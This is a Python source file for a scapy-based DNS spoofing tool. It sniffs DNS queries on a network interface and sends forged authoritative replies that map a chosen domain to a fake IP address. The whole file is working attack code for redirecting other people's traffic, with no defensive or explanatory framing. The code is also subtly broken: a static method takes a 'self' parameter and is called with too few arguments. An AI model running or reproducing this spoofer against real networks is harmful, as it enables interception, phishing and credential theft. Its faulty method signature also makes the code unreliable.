import time
import sys
import logging
import os
from scapy.all import *


class DNSSpoofer:
    
    def __init__(self, target_domain: str, fake_ip: str, interface: str):
        self.target_domain = target_domain
        self.fake_ip = fake_ip
        self.interface = interface
    
    def run(self) -> None:
        sniff(iface=self.interface, filter="udp port 53", prn=self.dns_spoof)
    
    @staticmethod
    def is_dns_query(pkt):
        return pkt.haslayer(DNS) and pkt[DNS].qr == 0
    
    @staticmethod
    def get_DNS_query_domain(pkt):
        return pkt[DNSQR].qname.decode()
    
    @staticmethod
    def craft_spoofed_DNS_response(self, pkt, fake_ip: str, query_domain: str):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=query_domain, ttl=10, rdata=fake_ip))
        return spoofed_pkt
    
    def dns_spoof(self, pkt):
        if self.is_dns_query(pkt):
            query_domain = self.get_DNS_query_domain(pkt)
            
            if self.target_domain in query_domain:
                spoofed_response = self.craft_spoofed_DNS_response(pkt, self.fake_ip, query_domain)
                send(spoofed_response, iface=self.interface, verbose=0)
